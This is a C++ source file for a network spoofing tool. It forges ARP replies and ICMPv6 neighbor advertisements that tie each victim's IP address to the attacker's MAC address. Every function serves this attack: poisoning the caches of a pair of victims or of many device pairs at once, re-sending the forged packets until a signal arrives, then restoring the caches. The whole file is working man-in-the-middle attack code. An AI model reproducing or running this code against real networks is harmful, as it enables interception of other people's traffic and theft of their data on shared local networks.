#include "Spoofer.h"
#include "common.h"
#include <iostream>
#include <chrono>
#include <thread>
#include <csignal>
#include <linux/if_ether.h> 
#include "ICMPv6.h"

extern volatile sig_atomic_t signaled;

Spoofer::Spoofer(string &interface, uint32_t sec, Protocol p, string &victim1ip, string &victim1mac, string &victim2ip, string &victim2mac)
	: socket(ETH_P_ALL), interface(interface), sec(sec), protocol(p), ip_1(victim1ip), ip_2(victim2ip)
{
	if (sec < 10)
		sec = 10;
	MACtoBin(victim2mac, vic2_mac);
	MACtoBin(victim1mac, vic1_mac);
	uint8_t ip1, ip2;
	ip1 = IPToBin(victim1ip, vic1_ip);
	ip2 = IPToBin(victim2ip, vic2_ip);
	if (ip1 == 0 || ip2 == 0)
		throw std::runtime_error(std::string("Spoofer::Spoofer() - Invalid IP address"));

	if ((ip1 == 1 && ip2 == 1 && protocol == Protocol::ARP) || (ip1 == 2 && ip2 == 2 && protocol == Protocol::NDP))
	{
		// Valid
	}
	else
		throw std::runtime_error(std::string("Spoofer::Spoofer() - Invalid IP address and protocol"));
	
	socket.loadInterface(interface);
}
Spoofer::Spoofer(string &interface, uint32_t sec, Protocol p)
	: socket(ETH_P_ALL), interface(interface), sec(sec), protocol(p)
{
	if (sec < 10)
		sec = 10;
	socket.loadInterface(interface);

}

void Spoofer::run()
{
	if (protocol == Protocol::ARP)
	{
		std::thread vic1(&Spoofer::poisonARP, this, vic1_ip, vic2_ip, vic2_mac);
		std::thread vic2(&Spoofer::poisonARP, this, vic2_ip, vic1_ip, vic1_mac);
		vic1.join();
		vic2.join();
		refreshARPCache();
	}
	else
	{
		std::thread vic1(&Spoofer::poisonNDP, this, ip_1, ip_2, vic2_mac);
		std::thread vic2(&Spoofer::poisonNDP, this, ip_2, ip_1, vic1_mac);
		vic1.join();
		vic2.join();
		refreshNDPCache();
	}
	
}


void Spoofer::massSend(std::vector<Packet> &packets)
{
	for(auto &packet: packets)
	{
		socket.send(packet);
		std::this_thread::sleep_for(std::chrono::milliseconds(20));
	}
}

void Spoofer::poisonARP(uint8_t *ip, uint8_t *dst_ip, uint8_t *dst_mac)
{
	Arp packet;
	packet.reply(ip, socket.src_mac, dst_ip, dst_mac);
	while(signaled == 0)
	{
		socket.send(packet);
		std::this_thread::sleep_for(std::chrono::milliseconds(sec));
	}	
}

void Spoofer::poisonNDP(std::string ip, std::string dst_ip, uint8_t *dst_mac)
{
	ICMPv6 packet;
	packet.naAdvert(socket.src_mac, ip, dst_mac, dst_ip);
	while (signaled == 0)
	{
		socket.send(packet);
		std::this_thread::sleep_for(std::chrono::milliseconds(sec));
	}
}

void Spoofer::refreshARPCache()
{
	Arp packet1;
	Arp packet2;
	packet1.reply(vic1_ip, vic1_mac, vic2_ip, vic2_mac);
	packet2.reply(vic2_ip, vic2_mac, vic1_ip, vic1_mac);
	socket.send(packet1);
	socket.send(packet2);
}

void Spoofer::refreshNDPCache()
{
	ICMPv6 packet1;
	ICMPv6 packet2;
	packet1.naAdvert(vic1_mac, ip_1, vic2_mac, ip_2);
	packet2.naAdvert(vic2_mac, ip_2, vic1_mac, ip_1);
	socket.send(packet1);
	socket.send(packet2);
}

void Spoofer::massRun(Devices &devices)
{
	std::vector<std::thread> threads;

	if (protocol == Protocol::ARP)
	{
		for (auto &group: devices)
		{
			std::thread th(&Spoofer::massRunARP, this, std::ref(group));
			threads.push_back(std::move(th));
		}
		for(auto &th: threads)
			th.join();
	}
	else
	{
		for (auto &group: devices)
		{
			std::thread th(&Spoofer::massRunNDP, this, std::ref(group));
			threads.push_back(std::move(th));
		}
		for(auto &th: threads)
			th.join();
	}
}

void Spoofer::massRunARP(std::pair<Device, Device> &group)
{
	std::vector<Arp> packets = prepareARPPackets(group);
	if (packets.empty())
		return;

	while (signaled == 0)
	{
		for(auto &packet: packets)
		{
			socket.send(packet);
			std::this_thread::sleep_for(std::chrono::milliseconds(20));
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(sec));
	}
	uint8_t mac1[6];
	uint8_t mac2[6];
	MACtoBin(group.first.mac, mac1);
	MACtoBin(group.second.mac, mac2);
	for(auto &packet: packets)
	{
		if(packet.getDstMac() == MACToInt(group.first.mac))
			packet.modifySrcMac(mac2);
		else if (packet.getDstMac() == MACToInt(group.second.mac))
			packet.modifySrcMac(mac1);
		else
			continue;
		socket.send(packet);
	}
}

void Spoofer::massRunNDP(std::pair<Device, Device> &group)
{
	std::vector<ICMPv6> packets = prepareNDPPackets(group);

	if (packets.empty())
		return;

	while (signaled == 0)
	{
		for(auto &packet: packets)
		{
			socket.send(packet);
			std::this_thread::sleep_for(std::chrono::milliseconds(20));
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(sec));
	}
	uint8_t mac1[6];
	uint8_t mac2[6];
	MACtoBin(group.first.mac, mac1);
	MACtoBin(group.second.mac, mac2);
	for(auto &packet: packets)
	{
		if(packet.getDstMac() == MACToInt(group.first.mac))
			packet.modifySrcMac(mac2);
		else if (packet.getDstMac() == MACToInt(group.second.mac))
			packet.modifySrcMac(mac1);
		else
			continue;
		socket.send(packet);
	}
}

std::vector<Arp> Spoofer::prepareARPPackets(std::pair<Device, Device> &group)
{
	uint8_t ip_bin[16];
	uint8_t send_ip1[16]; bool sender1 = false;
	uint8_t send_ip2[16]; bool sender2 = false;
	uint8_t mac[6];
	std::vector<Arp> packets;
	for (auto &ip : group.first.addresses)
	{

		if (ip.ipv4 && IPToBin(ip.address, send_ip1) == 1)
		{
			sender1 = true;
			break;
		}
	}
	for (auto &ip : group.second.addresses)
	{
		if (ip.ipv4 && IPToBin(ip.address, send_ip2) == 1)
		{
			sender2 = true;
			break;
		}
	}
	if (!sender1 || !sender2)
	{
		std::cerr << "No valid IP found" << std::endl;
		return packets;
	}
	
	Arp packet;
	MACtoBin(group.second.mac, mac);
	for (auto &ip : group.first.addresses)
	{
		if (!ip.ipv4 || IPToBin(ip.address, ip_bin) != 1)
			continue;
		packet.reply(ip_bin, socket.src_mac, send_ip2, mac);
		packets.push_back(packet);
	}
	MACtoBin(group.first.mac, mac);
	for (auto &ip : group.second.addresses)
	{
		if (!ip.ipv4 || IPToBin(ip.address, ip_bin) != 1)
			continue;
		packet.reply(ip_bin, socket.src_mac, send_ip1, mac);
		packets.push_back(packet);
	}
	return packets;
}

std::vector<ICMPv6> Spoofer::prepareNDPPackets(std::pair<Device, Device> &group)
{
	uint8_t ip_bin[16];
	std::string send_ip1; bool sender1 = false;
	std::string send_ip2; bool sender2 = false;
	uint8_t mac[6];
	std::vector<ICMPv6> packets;
	for (auto &ip : group.first.addresses)
	{

		if (!ip.ipv4 && IPToBin(ip.address, ip_bin) == 2)
		{
			send_ip1.assign(ip.address);
			sender1 = true;
			break;
		}
	}
	for (auto &ip : group.second.addresses)
	{
		if (!ip.ipv4 && IPToBin(ip.address, ip_bin) == 2)
		{
			send_ip2.assign(ip.address);
			sender2 = true;
			break;
		}
	}
	if (!sender1 || !sender2)
	{
		std::cerr << "No valid IP found" << std::endl;
		return packets;
	}
	
	ICMPv6 packet;
	MACtoBin(group.second.mac, mac);
	for (auto &ip : group.first.addresses)
	{
		if (ip.ipv4 || IPToBin(ip.address, ip_bin) != 2)
			continue;
		packet.naAdvert(socket.src_mac, ip.address, mac, send_ip2);
		packets.push_back(packet);
	}
	MACtoBin(group.first.mac, mac);
	for (auto &ip : group.second.addresses)
	{
		if (ip.ipv4 || IPToBin(ip.address, ip_bin) != 2)
			continue;
		packet.naAdvert(socket.src_mac, ip.address, mac, send_ip1);
		packets.push_back(packet);
	}
	return packets;
}
